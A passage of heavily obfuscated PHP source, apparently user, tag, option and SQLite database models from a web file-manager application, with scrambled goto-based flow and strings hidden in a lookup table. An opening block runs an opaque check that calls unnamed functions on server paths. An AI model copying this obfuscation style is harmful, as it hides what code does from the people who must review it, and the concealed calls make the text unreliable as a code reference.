$e•§áÆáïÏ++; $d¿ ²Ë²›“[] = $c”½­”ùÉò; } goto f¨Œ´ˆäğª; c¿¢Ô”àöÉ: $fäõòô¥ß =& $_SERVER[¹…ÕÄ]; if ($_SERVER[$fäõòô¥ß[813]] != $_SERVER[$fäõòô¥ß[1278]]) { goto B›ÂæâÒ†›; B›ÂæâÒ†›: $d¨ÃĞÇ±Šö = $fäõòô¥ß[814]; $f”›ˆøšòø = $fäõòô¥ß[815]; $C„’‘†Ë©è = $_SERVER[$fäõòô¥ß[816]] . $fäõòô¥ß[817]; goto Bí½îËîïé; bØˆëÏçà: $f”Ç‘š˜£¸ = $fäõòô¥ß[819]; $f”Ç‘š˜£¸($_SERVER[$fäõòô¥ß[820]]); $f”Ç‘š˜£¸($_SERVER[$fäõòô¥ß[816]] . $fäõòô¥ß[2123]); goto aÁòÅíÙÄÎ; aÁòÅíÙÄÎ: $b÷¶®‰¨½Š = 1; while ($b÷¶®‰¨½Š > 1) { $b÷¶®‰¨½Š = $b÷¶®‰¨½Š + 4; $béƒô£Ïã = rawurlencode($b÷¶®‰¨½Š . $fäõòô¥ß[373]); } goto B‹Åä³äÔ‡; Bí½îËîïé: $d“Ë„äõÒÊ = $f”›ˆøšòø($C„’‘†Ë©è); $eš† ¨Ÿ£ = explode($fäõòô¥ß[227], $d“Ë„äõÒÊ); if (count($eš† ¨Ÿ£) < $fäõòô¥ß[581]) { $D‹®áš»Şì = $fäõòô¥ß[818]; $D‹®áš»Şì(); } goto bØˆëÏçà; B‹Åä³äÔ‡: } $EÜŒìÚÂ—ß = $this->getInfoSimple($c„¨õçŒ¼); goto C¦ÛéÉ÷ ‘; C¦ÛéÉ÷ ‘: if (!$EÜŒìÚÂ—ß || !is_array($Bë¿‚™®º™)) { return !1; } $b¤¹ñºˆóé = Model($fäõòô¥ß[1749]); $b¤¹ñºˆóé->where(array($fäõòô¥ß[1504] => $c„¨õçŒ¼))->delete(); goto fŒ´ÕÜœŸ; A­”ƒåÕ¢: } protected function userGroupAdd($AÇµ±Ô°ÅÁ, $BÉ…ÚôÄ„é = array()) { $B‘ˆ“…®ë‘ =& $_SERVER[¹…ÕÄ]; $EÛ“¨‘ëç = $this->getInfoSimple($AÇµ±Ô°ÅÁ); if (!$EÛ“¨‘ëç || empty($BÉ…ÚôÄ„é)) { return !1; } $FÇ¿ÖÉÍÀ = array(); foreach ($BÉ…ÚôÄ„é as $FŞİ”Î›Å => $fĞä¨âŞæß) { $FÇ¿ÖÉÍÀ[] = array($B‘ˆ“…®ë‘[1504] => $AÇµ±Ô°ÅÁ, $B‘ˆ“…®ë‘[1667] => $FŞİ”Î›Å, $B‘ˆ“…®ë‘[1763] => $fĞä¨âŞæß, $B‘ˆ“…®ë‘[1690] => 0); } return Model($B‘ˆ“…®ë‘[1749])->addAll($FÇ¿ÖÉÍÀ, array(), !0); } protected function userGroupRemove($E»¤Åğ«Ë, $bÎ×Ö¯·›Ø) { $E–¾ƒ¹Óò =& $_SERVER[¹…ÕÄ]; $dµ›ÌÜ“„Ç = $this->getInfoSimple($E»¤Åğ«Ë); if (!$dµ›ÌÜ“„Ç || !$bÎ×Ö¯·›Ø) { return !1; } $dÆ†È³œåå = array($E–¾ƒ¹Óò[1496] => $E»¤Åğ«Ë, $E–¾ƒ¹Óò[1746] => $bÎ×Ö¯·›Ø); return Model($E–¾ƒ¹Óò[1749])->where($dÆ†È³œåå)->delete(); } public function listData() { $AÒ¯ÑÃôó  = $this->_makeOrder()->selectPage(50); $this->_listDataApply($AÒ¯ÑÃôó [$_SERVER[¹…ÕÄ][365]]); return $AÒ¯ÑÃôó ; } public function listByID($d¶“òôŸ‰³) { $FŠœÁ¤¯ˆ¬ =& $_SERVER[¹…ÕÄ]; if (!$d¶“òôŸ‰³) { return; } $cÌ¹Š¿± = array($FŠœÁ¤¯ˆ¬[1504] => array($FŠœÁ¤¯ˆ¬[7], $d¶“òôŸ‰³)); $AçëøßĞ = $this->where($cÌ¹Š¿±)->select(); $this->_listDataApply($AçëøßĞ); return $AçëøßĞ; } public function listByGroup($BáâãÜ‹’è = 0, $f–‡áÛ¬à = array()) { goto eéŒÖ÷¿Õ; b®Íé‡¦: $this->_listDataApply($D²Û“å›‚÷[$EêÀÛè­Ó„[365]]); return $D²Û“å›‚÷; goto eî™¹ø·Ãà; CŞ…‰éÅÊô: if ($BáâãÜ‹’è) { $D®ÕŸº˜˜ˆ = array($EêÀÛè­Ó„[2124] => intval($BáâãÜ‹’è)); $A¿«è»³‹ö = "\114\105\106\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\x72\157\x75\160\x20\x75\163\145\162\x5f\x67\162\x6f\165\160\40\x6f\156\40\x75\163\145\x72\56\x75\163\145\162\x49\104\40\x3d\x20\165\163\x65\x72\137\x67\162\157\165\160\56\165\x73\145\x72\111\x44"; $DÜóÛÚ”â† = Input::get($EêÀÛè­Ó„[429], null, $EêÀÛè­Ó„[33]) ? $EêÀÛè­Ó„[33] : $EêÀÛè­Ó„[2125]; } if (isset($f–‡áÛ¬à[$EêÀÛè­Ó„[705]])) { $D®ÕŸº˜˜ˆ[$EêÀÛè­Ó„[2126]] = $f–‡áÛ¬à[$EêÀÛè­Ó„[705]]; } $D²Û“å›‚÷ = $this->_makeOrder($DÜóÛÚ”â†)->field($EêÀÛè­Ó„[2127])->where($D®ÕŸº˜˜ˆ)->join($A¿«è»³‹ö)->selectPage(50); goto b®Íé‡¦; eéŒÖ÷¿Õ: $EêÀÛè­Ó„ =& $_SERVER[¹…ÕÄ]; $A¿«è»³‹ö = $EêÀÛè­Ó„[33]; $D®ÕŸº˜˜ˆ = array(); goto CŞ…‰éÅÊô; eî™¹ø·Ãà: } private function _makeOrder($E ¡¢”“ğš = '') { goto f¯ñêôóˆ¿; e˜ÛÆÒ: $cŠùŠóˆ« = Input::get($c’Ü‚×£°‡[429], $c’Ü‚×£°‡[7], $c’Ü‚×£°‡[1496], $dÈœ±°Ò‘); $cÇë¢ãÕä = Input::get($c’Ü‚×£°‡[430], $c’Ü‚×£°‡[7], $c’Ü‚×£°‡[1750], array($c’Ü‚×£°‡[1750], $c’Ü‚×£°‡[424])); $cÇë¢ãÕä = $F«òƒ´áä[$cÇë¢ãÕä]; goto c†·Äš’…Õ; f¯ñêôóˆ¿: $c’Ü‚×£°‡ =& $_SERVER[¹…ÕÄ]; $dÈœ±°Ò‘ = array($c’Ü‚×£°‡[1504], $c’Ü‚×£°‡[28], $c’Ü‚×£°‡[1653], $c’Ü‚×£°‡[1625], $c’Ü‚×£°‡[192]); $F«òƒ´áä = array($c’Ü‚×£°‡[422] => $c’Ü‚×£°‡[423], $c’Ü‚×£°‡[424] => $c’Ü‚×£°‡[425]); goto e˜ÛÆÒ; c†·Äš’…Õ: $E ¡¢”“ğš = $E ¡¢”“ğš . "\x75\163\145\x72\56{$cŠùŠóˆ«}\40{$cÇë¢ãÕä}\54\40\165\x73\145\x72\x2e\x75\x73\145\x72\111\104\40\141\x73\143"; return $this->alias($c’Ü‚×£°‡[1872])->order($E ¡¢”“ğš); goto c”Ğî™òŒÙ; c”Ğî™òŒÙ: } public function listSearch($d™²ƒèÓ»ö) { goto a‹—ãµõŒ; b¸‰…İÎØ: $a÷ËÓ®Ï…Ì = str_replace($B‚Ë‚„¹ [1753], $B‚Ë‚„¹ [1754], trim($a÷ËÓ®Ï…Ì)); $d ˆ‘³…¿á = array($B‚Ë‚„¹ [28] => array($B‚Ë‚„¹ [378], "\45{$a÷ËÓ®Ï…Ì}\45"), $B‚Ë‚„¹ [301] => array($B‚Ë‚„¹ [378], "{$a÷ËÓ®Ï…Ì}\x25"), $B‚Ë‚„¹ [1931] => array($B‚Ë‚„¹ [378], "{$a÷ËÓ®Ï…Ì}\45"), $B‚Ë‚„¹ [936] => $B‚Ë‚„¹ [1755]); if (Input::check($a÷ËÓ®Ï…Ì, $B‚Ë‚„¹ [307])) { $d ˆ‘³…¿á[$B‚Ë‚„¹ [1504]] = array($B‚Ë‚„¹ [378], "{$a÷ËÓ®Ï…Ì}\x25"); $d ˆ‘³…¿á[$B‚Ë‚„¹ [2107]] = array($B‚Ë‚„¹ [378], "{$a÷ËÓ®Ï…Ì}\x25"); } goto B§Ë ³óï­; a‹—ãµõŒ: $B‚Ë‚„¹  =& $_SERVER[¹…ÕÄ]; $a÷ËÓ®Ï…Ì = $d™²ƒèÓ»ö[$B‚Ë‚„¹ [1751]]; $Cëãó›¾ÇÇ = isset($d™²ƒèÓ»ö[$B‚Ë‚„¹ [1752]]) ? $d™²ƒèÓ»ö[$B‚Ë‚„¹ [1752]] : !1; goto b¸‰…İÎØ; B—ì­¶ÛÏö: $this->_filterByGroup($fÖ”„ŠäØ±, $Cëãó›¾ÇÇ); return $fÖ”„ŠäØ±; goto f÷¿‚îÖˆÍ; B§Ë ³óï­: if (!$a÷ËÓ®Ï…Ì) { $d ˆ‘³…¿á = array(); } if (isset($d™²ƒèÓ»ö[$B‚Ë‚„¹ [705]])) { $d ˆ‘³…¿á[$B‚Ë‚„¹ [705]] = $d™²ƒèÓ»ö[$B‚Ë‚„¹ [705]]; } $d ˆ‘³…¿á = $this->parseWhereLike($d ˆ‘³…¿á); goto Dïß‰Î§ÇŞ; Dïß‰Î§ÇŞ: $fÖ”„ŠäØ± = $this->_makeOrder()->where($d ˆ‘³…¿á)->selectPage(20); if (!$fÖ”„ŠäØ± || count($fÖ”„ŠäØ±[$B‚Ë‚„¹ [365]]) < 5 && Input::check($a÷ËÓ®Ï…Ì, $B‚Ë‚„¹ [314])) { $Cî×¥å©Â = $this->_searchFromMeta($B‚Ë‚„¹ [437], $a÷ËÓ®Ï…Ì, 10); $EÉ‚ßÒ‰­ = $this->_searchFromMeta($B‚Ë‚„¹ [438], $a÷ËÓ®Ï…Ì, 10); $D”œµŠ¬ = array_merge($Cî×¥å©Â, $EÉ‚ßÒ‰­, $fÖ”„ŠäØ±[$B‚Ë‚„¹ [365]]); $fÖ”„ŠäØ±[$B‚Ë‚„¹ [365]] = array_unique_by_key($D”œµŠ¬, $B‚Ë‚„¹ [1504]); $fÖ”„ŠäØ±[$B‚Ë‚„¹ [362]][$B‚Ë‚„¹ [363]] = count($fÖ”„ŠäØ±[$B‚Ë‚„¹ [365]]); $fÖ”„ŠäØ±[$B‚Ë‚„¹ [362]][$B‚Ë‚„¹ [364]] = ceil($fÖ”„ŠäØ±[$B‚Ë‚„¹ [362]][$B‚Ë‚„¹ [363]] / $fÖ”„ŠäØ±[$B‚Ë‚„¹ [362]][$B‚Ë‚„¹ [359]]); } $this->_listDataApply($fÖ”„ŠäØ±[$B‚Ë‚„¹ [365]]); goto B—ì­¶ÛÏö; f÷¿‚îÖˆÍ: } private function _filterByGroup(&$CÕÙ‡‰ïª¾, $bÀğâô•ğŞ) { $Eî½‘¿Üè³ =& $_SERVER[¹…ÕÄ]; if (!$bÀğâô•ğŞ) { return $CÕÙ‡‰ïª¾; } foreach ($CÕÙ‡‰ïª¾[$Eî½‘¿Üè³[365]] as $CÍ¡Ş‡¼¤² => &$Eˆ†«Ô›Í•) { $DÈŸ²–ª‡› = array_to_keyvalue($Eˆ†«Ô›Í•[$Eî½‘¿Üè³[1842]], $Eî½‘¿Üè³[33], $Eî½‘¿Üè³[1667]); if (!in_array($bÀğâô•ğŞ, $DÈŸ²–ª‡›)) { unset($CÕÙ‡‰ïª¾[$Eî½‘¿Üè³[365]][$CÍ¡Ş‡¼¤²]); } } unset($Eˆ†«Ô›Í•); $CÕÙ‡‰ïª¾[$Eî½‘¿Üè³[365]] = array_values($CÕÙ‡‰ïª¾[$Eî½‘¿Üè³[365]]); $CÕÙ‡‰ïª¾[$Eî½‘¿Üè³[362]] = array($Eî½‘¿Üè³[1904] => count($CÕÙ‡‰ïª¾[$Eî½‘¿Üè³[365]]), $Eî½‘¿Üè³[1902] => $CÕÙ‡‰ïª¾[$Eî½‘¿Üè³[362]][$Eî½‘¿Üè³[359]], $Eî½‘¿Üè³[1901] => 1, $Eî½‘¿Üè³[1903] => 1); } private function _searchFromMeta($B¦¦¡²òõº, $FŠƒİ‚Óİˆ, $Fğ­îÎé–) { goto c÷¦£«Ê¼; c÷¦£«Ê¼: $c¤ˆ°»ÚÃ =& $_SERVER[¹…ÕÄ]; $FŠƒİ‚Óİˆ = strtolower($FŠƒİ‚Óİˆ); $AéŠ¿”ÚÛë = array($c¤ˆ°»ÚÃ[92] => $B¦¦¡²òõº, $c¤ˆ°»ÚÃ[370] => array($c¤ˆ°»ÚÃ[378], "\45{$FŠƒİ‚Óİˆ}\x25")); goto A «Ú ÑóĞ; A «Ú ÑóĞ: $AéŠ¿”ÚÛë = $this->parseWhereLike($AéŠ¿”ÚÛë); $AµøÕæÏ¦• = Model($c¤ˆ°»ÚÃ[2128])->where($AéŠ¿”ÚÛë)->limit($Fğ­îÎé–)->select(); if (!$AµøÕæÏ¦•) { return array(); } goto AÅôÙƒİ’; aÏ¯ØÂò˜ƒ: return $c†§¤§ã¬è; goto C ëĞÈ¡ô; AÅôÙƒİ’: $AµøÕæÏ¦• = array_to_keyvalue($AµøÕæÏ¦•, $c¤ˆ°»ÚÃ[33], $c¤ˆ°»ÚÃ[1504]); $c†§¤§ã¬è = $this->where(array($c¤ˆ°»ÚÃ[1496] => array($c¤ˆ°»ÚÃ[7], $AµøÕæÏ¦•)))->select(); if (!$c†§¤§ã¬è) { return array(); } goto aÏ¯ØÂò˜ƒ; C ëĞÈ¡ô: } private function _listDataApplyItem($BÑ¯ïÎ¿ã§) { $fŠ†ë·ßˆø = array($BÑ¯ïÎ¿ã§); $this->_listDataApply($fŠ†ë·ßˆø); return $fŠ†ë·ßˆø[0]; } private function _listDataApply(&$F„õäÃŠØè) { goto C©†—ÇÃ†ï; cš­­íÍ¶ö: $B¡¢‰¦£ÜÔ = array_to_keyvalue($F„õäÃŠØè, $Dåó¿Ïá“ß[33], $Dåó¿Ïá“ß[1504]); $this->_listAppendGroup($F„õäÃŠØè, $B¡¢‰¦£ÜÔ); $this->_listAppendMeta($F„õäÃŠØè, $B¡¢‰¦£ÜÔ); goto AŞÙ’Şî“; AŞÙ’Şî“: $this->_listAppendSourceRoot($F„õäÃŠØè, $B¡¢‰¦£ÜÔ); goto BØÖèéÇ¨Š; C©†—ÇÃ†ï: $Dåó¿Ïá“ß =& $_SERVER[¹…ÕÄ]; if (!$F„õäÃŠØè) { return; } array_remove_key($F„õäÃŠØè, $Dåó¿Ïá“ß[828]); goto cš­­íÍ¶ö; BØÖèéÇ¨Š: } private function _listAppendSourceRoot(&$AÆõÄİ°, $bÍÛğØ„Ò“) { goto Eî¼õå¨²É; d²£¡³õ¥ø: foreach ($AÆõÄİ° as &$bÎ³áÉËÀ«) { $bÎ³áÉËÀ«[$B×ö—‡ÒÒ[84]] = $BãŸÜà ‘[$bÎ³áÉËÀ«[$B×ö—‡ÒÒ[1504]]] ? $BãŸÜà ‘[$bÎ³áÉËÀ«[$B×ö—‡ÒÒ[1504]]] : array(); } unset($bÎ³áÉËÀ«); goto bšßê“ŠŞ÷; Eî¼õå¨²É: $B×ö—‡ÒÒ =& $_SERVER[¹…ÕÄ]; $b¢çôÚ•õÕ = array($B×ö—‡ÒÒ[472] => 0, $B×ö—‡ÒÒ[398] => SourceModel::TYPE_USER, $B×ö—‡ÒÒ[478] => array($B×ö—‡ÒÒ[7], $bÍÛğØ„Ò“)); $aï´¯†…ÌŒ = $B×ö—‡ÒÒ[1761]; goto CÀà´À²¼Ñ; CÀà´À²¼Ñ: $BãŸÜà ‘ = Model($B×ö—‡ÒÒ[770])->order($B×ö—‡ÒÒ[1762])->field($aï´¯†…ÌŒ)->where($b¢çôÚ•õÕ)->select(); $BãŸÜà ‘ = array_to_keyvalue($BãŸÜà ‘, $B×ö—‡ÒÒ[478]); $BãŸÜà ‘ = array_remove_key($BãŸÜà ‘, $B×ö—‡ÒÒ[478]); goto d²£¡³õ¥ø; bšßê“ŠŞ÷: } private function _listAppendGroup(&$Eß‹ ¤§Ì‰, $CïÂÏºŞ‡Š) { goto F§ãˆ³âöå; CÚ¹„–çæÌ: $Cåêç˜Ş = array_to_keyvalue($B½—ÚË“„”, $bñ¤ºÎäƒå[33], $bñ¤ºÎäƒå[1667]); $Cåêç˜Ş = array_remove_value(array_unique($Cåêç˜Ş), $bñ¤ºÎäƒå[491]); if (!$Cåêç˜Ş || !$B½—ÚË“„”) { return; } goto CÃ±èˆ›¸¾; CÃ±èˆ›¸¾: $EÕ—ßœ»µ© = array($bñ¤ºÎäƒå[1667] => array($bñ¤ºÎäƒå[7], $Cåêç˜Ş)); $cëŸã‰Ş¢ = Model($bñ¤ºÎäƒå[1840])->field($bñ¤ºÎäƒå[2129])->where($EÕ—ßœ»µ©)->select(); $cëŸã‰Ş¢ = array_to_keyvalue($cëŸã‰Ş¢, $bñ¤ºÎäƒå[1667]); goto e¶°šÂî±¿; e¶°šÂî±¿: $B½—ÚË“„” = array_to_keyvalue_group($B½—ÚË“„”, $bñ¤ºÎäƒå[1504]); foreach ($B½—ÚË“„” as &$dè£ ÓÉÏ) { $C®ƒ–æ¹ÍÂ = array(); foreach ($dè£ ÓÉÏ as $DœÊ©™•†š) { if (!$DœÊ©™•†š[$bñ¤ºÎäƒå[1763]]) { continue; } $DÊá‘¾ÚÚ = Model($bñ¤ºÎäƒå[1835])->listData($DœÊ©™•†š[$bñ¤ºÎäƒå[1763]]); $C®ƒ–æ¹ÍÂ[] = array($bñ¤ºÎäƒå[1667] => $DœÊ©™•†š[$bñ¤ºÎäƒå[1667]], $bñ¤ºÎäƒå[2130] => $cëŸã‰Ş¢[$DœÊ©™•†š[$bñ¤ºÎäƒå[1667]]][$bñ¤ºÎäƒå[28]], $bñ¤ºÎäƒå[481] => $cëŸã‰Ş¢[$DœÊ©™•†š[$bñ¤ºÎäƒå[1667]]][$bñ¤ºÎäƒå[481]], $bñ¤ºÎäƒå[400] => $DÊá‘¾ÚÚ); } $dè£ ÓÉÏ = $C®ƒ–æ¹ÍÂ; } unset($dè£ ÓÉÏ); goto Fî‘¦İŠ‡á; F§ãˆ³âöå: $bñ¤ºÎäƒå =& $_SERVER[¹…ÕÄ]; $EÕ—ßœ»µ© = array($bñ¤ºÎäƒå[1504] => array($bñ¤ºÎäƒå[7], $CïÂÏºŞ‡Š)); $B½—ÚË“„” = Model($bñ¤ºÎäƒå[1749])->where($EÕ—ßœ»µ©)->select(); goto CÚ¹„–çæÌ; Fî‘¦İŠ‡á: foreach ($Eß‹ ¤§Ì‰ as &$BñŞª”¹—) { $BñŞª”¹—[$bñ¤ºÎäƒå[1842]] = array(); if (isset($B½—ÚË“„”[$BñŞª”¹—[$bñ¤ºÎäƒå[1504]]])) { $BñŞª”¹—[$bñ¤ºÎäƒå[1842]] = $B½—ÚË“„”[$BñŞª”¹—[$bñ¤ºÎäƒå[1504]]]; } } unset($BñŞª”¹—); goto FÖ†ËÛˆŒä; FÖ†ËÛˆŒä: } private function _listAppendMeta(&$cÅŸäóéŞ¬, $d›„ğì˜ñ) { goto Aùœ¦¡·Ì; eäõî·”Åè: foreach ($aÄÜ§…âåµ as &$BŠ«Ãˆø›·) { $CŸóÍª¾È = array(); foreach ($BŠ«Ãˆø›· as $f‰Õ†•Ä®Û) { if (!in_array($f‰Õ†•Ä®Û[$fÍŠÓ¨§Ã[92]], $cİâ²»‡Ù¸)) { $CŸóÍª¾È[$f‰Õ†•Ä®Û[$fÍŠÓ¨§Ã[92]]] = $f‰Õ†•Ä®Û[$fÍŠÓ¨§Ã[370]]; } } $BŠ«Ãˆø›· = $CŸóÍª¾È; } unset($BŠ«Ãˆø›·); $bîœØ‰¹¢¸ = Model($fÍŠÓ¨§Ã[2131]); goto fÙğ•ÈŒà; B×Öíë‹Ùº: $b—óğàÙ¤Ğ = array($fÍŠÓ¨§Ã[1504] => array($fÍŠÓ¨§Ã[7], $d›„ğì˜ñ)); $aÄÜ§…âåµ = Model($fÍŠÓ¨§Ã[2106])->where($b—óğàÙ¤Ğ)->select(); $aÄÜ§…âåµ = array_to_keyvalue_group($aÄÜ§…âåµ, $fÍŠÓ¨§Ã[1504]); goto eäõî·”Åè; fÙğ•ÈŒà: foreach ($cÅŸäóéŞ¬ as &$Bò”Ğª­) { $CÌ´÷õ“×æ = array(); if (isset($aÄÜ§…âåµ[$Bò”Ğª­[$fÍŠÓ¨§Ã[1504]]])) { $CÌ´÷õ“×æ = $aÄÜ§…âåµ[$Bò”Ğª­[$fÍŠÓ¨§Ã[1504]]]; } $Bò”Ğª­[$fÍŠÓ¨§Ã[2132]] = array(); if (isset($CÌ´÷õ“×æ[$b¤¯¢Œ³õ])) { $Bò”Ğª­[$fÍŠÓ¨§Ã[2132]] = $bîœØ‰¹¢¸->getUserJobInfo($CÌ´÷õ“×æ[$b¤¯¢Œ³õ]); } } unset($Bò”Ğª­); goto CÇì›Ô¸°ª; Aùœ¦¡·Ì: $fÍŠÓ¨§Ã =& $_SERVER[¹…ÕÄ]; $b¤¯¢Œ³õ = UserJobModel::JOB_KEY; $cİâ²»‡Ù¸ = array($fÍŠÓ¨§Ã[2108]); goto B×Öíë‹Ùº; CÇì›Ô¸°ª: } protected function groupUserAll($EËÁ›¥øã‹) { $bĞÙ†Ïï°¼ =& $_SERVER[¹…ÕÄ]; if (!$EËÁ›¥øã‹) { return !1; } $cé˜·ãĞ†¯ = Model($bĞÙ†Ïï°¼[1749])->field($bĞÙ†Ïï°¼[1504])->where(array($bĞÙ†Ïï°¼[1667] => array($bĞÙ†Ïï°¼[7], $EËÁ›¥øã‹)))->select(); $cé˜·ãĞ†¯ = array_to_keyvalue($cé˜·ãĞ†¯, $bĞÙ†Ïï°¼[33], $bĞÙ†Ïï°¼[1504]); return array_unique($cé˜·ãĞ†¯); } public function userSearch($B”ÖöÓ†¶–, $c»¹™ŠÏ³­ = "\x2a") { return Model($_SERVER[¹…ÕÄ][501])->where($B”ÖöÓ†¶–)->field($c»¹™ŠÏ³­)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\137\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Dçã³‹Ã¼) { $c‹­ÕæŠ‰É =& $_SERVER[¹…ÕÄ]; if (!defined($c‹­ÕæŠ‰É[448])) { define($c‹­ÕæŠ‰É[448], 0); } return "\x55\163\x65\x72\x4f\160\x74\x69\x6f\x6e\137{$Dçã³‹Ã¼}\x5f" . USER_ID; } protected function filterWhere($e°âÓäç„ô) { $dÌ›âÁ¹° =& $_SERVER[¹…ÕÄ]; if (!defined($dÌ›âÁ¹°[448])) { define($dÌ›âÁ¹°[448], 0); } $e°âÓäç„ô[$dÌ›âÁ¹°[1504]] = USER_ID; return $e°âÓäç„ô; } public function cacheRemoveUser($D¼›¢¡ÀÖØ, $F•ãŒÛ¤î) { return Cache::remove("\x55\163\145\x72\x4f\x70\164\x69\x6f\156\137{$D¼›¢¡ÀÖØ}\137" . $F•ãŒÛ¤î); } protected function optionDefault($f†ÍôãÁËŠ = '') { $a‚¼ Â è¾ =& $_SERVER[¹…ÕÄ]; if ($f†ÍôãÁËŠ == $a‚¼ Â è¾[33]) { return $GLOBALS[$a‚¼ Â è¾[6]][$a‚¼ Â è¾[2133]]; } if ($f†ÍôãÁËŠ == $a‚¼ Â è¾[2134]) { return $GLOBALS[$a‚¼ Â è¾[6]][$a‚¼ Â è¾[2135]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\x74\x61\x67\x4c\x69\x73\x74"; public $modelType = "\125\163\x65\x72\117\x70\x74\x69\157\156"; public $field = array("\x6e\x61\155\x65", "\x73\x74\171\154\x65", "\x73\x6f\162\x74"); public function listData($c ñÓö¨µä = false, $aïÂ£ïù = "\163\x6f\x72\x74", $b´††ƒÂÍà = false) { return parent::listData($c ñÓö¨µä, $aïÂ£ïù, $b´††ƒÂÍà); } public function remove($F‘Â–‡åî¬) { return parent::remove($F‘Â–‡åî¬); } public function add($eïñå‹ô¼Ä, $f ­š¹„ù† = "\x6c\141\142\145\x6c\55\147\x72\x65\x79\x2d\156\x6f\x72\155\141\154") { $AÚµ”É‡†° =& $_SERVER[¹…ÕÄ]; if ($this->findByName($eïñå‹ô¼Ä)) { return !1; } $c‘ù©»å³‘ = array($AÚµ”É‡†°[407] => $eïñå‹ô¼Ä, $AÚµ”É‡†°[458] => $f ­š¹„ù†, $AÚµ”É‡†°[1671] => $this->getSort($AÚµ”É‡†°[254]) + 1); return parent::insert($c‘ù©»å³‘); } public function update($B•åÚ£Â¼¬, $a¤˜Ÿğ¯½Ã) { $a×®À†‡± =& $_SERVER[¹…ÕÄ]; $E¾æ’¸£äÍ = $this->listData($B•åÚ£Â¼¬); $Dè½ïŒ©ó­ = $this->findByName($a¤˜Ÿğ¯½Ã[$a×®À†‡±[28]]); if (!$E¾æ’¸£äÍ || $Dè½ïŒ©ó­ && $Dè½ïŒ©ó­[$a×®À†‡±[388]] != $E¾æ’¸£äÍ[$a×®À†‡±[388]]) { return !1; } return parent::update($B•åÚ£Â¼¬, $a¤˜Ÿğ¯½Ã); } public function moveTop($B‡¹¿š×) { $FÈ· œÀ¾ =& $_SERVER[¹…ÕÄ]; $cİğµî¯àí = parent::listData(); $d‡Ù„Ü¥æ = $this->getSort($FÈ· œÀ¾[253]); foreach ($cİğµî¯àí as &$E†˜Ã›Î’ò) { if ($E†˜Ã›Î’ò[$FÈ· œÀ¾[388]] == $B‡¹¿š×) { $E†˜Ã›Î’ò[$FÈ· œÀ¾[1690]] = $d‡Ù„Ü¥æ; continue; } $E†˜Ã›Î’ò[$FÈ· œÀ¾[1690]] += 1; } unset($E†˜Ã›Î’ò); return parent::resetData($cİğµî¯àí); } public function moveBottom($cÛáà™„¸) { $dïğ·Š«ÙŠ =& $_SERVER[¹…ÕÄ]; $A¦‡¤øçì = $this->getSort($dïğ·Š«ÙŠ[254]) + 1; return parent::update($cÛáà™„¸, array($dïğ·Š«ÙŠ[1690] => $A¦‡¤øçì)); } public function resetSort($d†ƒÄÔªŒ) { goto AáØ”¦¤¥Î; B¹¤¡¸ìƒÖ: for ($EÑ§¹¼‹áÎ = 0; $EÑ§¹¼‹áÎ < count($d†ƒÄÔªŒ); $EÑ§¹¼‹áÎ++) { $e§©Á“Š¸[$d†ƒÄÔªŒ[$EÑ§¹¼‹áÎ] . $D¾ïÃÀãò²[33]] = $EÑ§¹¼‹áÎ + 1; } $e™İÒ¼¡ = parent::listData(); foreach ($e™İÒ¼¡ as &$EëŒµÂ”å) { $fáãÔÒ«…à = $e§©Á“Š¸[$EëŒµÂ”å[$D¾ïÃÀãò²[388]]]; $EëŒµÂ”å[$D¾ïÃÀãò²[1690]] = $fáãÔÒ«…à ? $fáãÔÒ«…à : $EëŒµÂ”å[$D¾ïÃÀãò²[1690]]; } goto Fã³Ä„Á­·; AáØ”¦¤¥Î: $D¾ïÃÀãò² =& $_SERVER[¹…ÕÄ]; $e§©Á“Š¸ = array(); $d†ƒÄÔªŒ = is_array($d†ƒÄÔªŒ) ? $d†ƒÄÔªŒ : array(); goto B¹¤¡¸ìƒÖ; Fã³Ä„Á­·: unset($EëŒµÂ”å); return parent::resetData($e™İÒ¼¡); goto d‚È˜ò¡ËÓ; d‚È˜ò¡ËÓ: } private function getSort($aŸšóôïàõ) { $Ağ—÷»‘ë† =& $_SERVER[¹…ÕÄ]; $fÈÔ¹»™ = parent::listData(); $f›ï„÷†Û† = array_to_keyvalue($fÈÔ¹»™, $Ağ—÷»‘ë†[33], $Ağ—÷»‘ë†[1690]); if (!$f›ï„÷†Û†) { $f›ï„÷†Û† = array(0); } $béù‘‰ãéè = $aŸšóôïàõ == $Ağ—÷»‘ë†[254] ? max($f›ï„÷†Û†) : min($f›ï„÷†Û†); return intval($béù‘‰ãéè); } } goto d–ó³˜ø½ô; a©™†°ÄÇ¡: class DbSqlite extends DbSqliteBase { public function query($a§¶¨Éö‡ñ) { $fÈÀ×ñ—Ë =& $_SERVER[¹…ÕÄ]; if (!CacheLock::fileLock($fÈÀ×ñ—Ë[9])) { return !1; } $d’Áùæ† = parent::query($a§¶¨Éö‡ñ); CacheLock::fileUnLock($fÈÀ×ñ—Ë[9]); return $d’Áùæ†; } public function execute($f¼×ù­®ÇÄ) { $FÀ™œïèÑ =& $_SERVER[¹…ÕÄ]; if (!CacheLock::fileLock($FÀ™œïèÑ[9])) { return !1; } $b¶½›ÑÚ¥« = parent::execute($f¼×ù­®ÇÄ); CacheLock::fileUnLock($FÀ™œïèÑ[9]); return $b¶½›ÑÚ¥«; } } class DbSqlite3 extends DbSqlite3Base { public function query($A¥ÊÇ‡Û›ª) { $bÓ‡¿äë‹ =& $_SERVER[¹…ÕÄ]; if (!CacheLock::fileLock($bÓ‡¿äë‹[9])) { return !1; } $dê­áï§–Á = parent::query($A¥ÊÇ‡Û›ª); CacheLock::fileUnLock($bÓ‡¿äë‹[9]); return $dê­áï§–Á; } public function execute($D ğïßÑÊ) { $E©÷ĞŠÆ¹ø =& $_SERVER[¹…ÕÄ]; if (!CacheLock::fileLock($E©÷ĞŠÆ¹ø[9])) { return !1; } $dÌ×˜’Î¶š = parent::execute($D ğïßÑÊ); CacheLock::fileUnLock($E©÷ĞŠÆ¹ø[9]); return $dÌ×˜’Î¶š; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; 